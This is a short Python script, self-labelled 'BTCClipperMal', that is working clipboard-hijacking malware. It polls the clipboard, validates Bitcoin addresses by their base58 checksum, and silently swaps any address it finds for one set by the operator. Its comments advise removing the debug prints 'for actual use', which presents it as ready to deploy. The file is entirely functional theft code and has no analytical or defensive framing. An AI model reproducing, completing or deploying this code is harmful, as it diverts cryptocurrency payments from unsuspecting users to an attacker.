from hashlib import sha256
from time import sleep
import clipboard

digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

ReplacementAddress = "Paste Your BTC Address Here"

def decode_base58(bc, length):
    n = 0
    for char in bc:
        n = n * 58 + digits58.index(char)
    return n.to_bytes(length, 'big')
def check_bc(bc):
    try:
        bcbytes = decode_base58(bc, 25)
        return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
    except Exception:
        return False

if __name__ == "__main__":
    print('BTCClipperMal - Multiplatform') #<Just For Debugging. Remove for actual use
    while 1:
        try:
            sleep(0.5) #<This can be modified or removed. With 0 delay it can sometimes lag the clipboard. recommended is 0.1 - 1
            if check_bc(clipboard.paste()):
                previous = clipboard.paste() #<Just For Debugging. Remove for actual use
                print('string found, replacing with value...') #<Just For Debugging. Remove for actual use
                clipboard.copy(ReplacementAddress)
                print('Replaced Value Successfully. | Changed ' + previous + ' To ' + ReplacementAddress) #<Just For Debugging. Remove for actual use
        except:
            continue
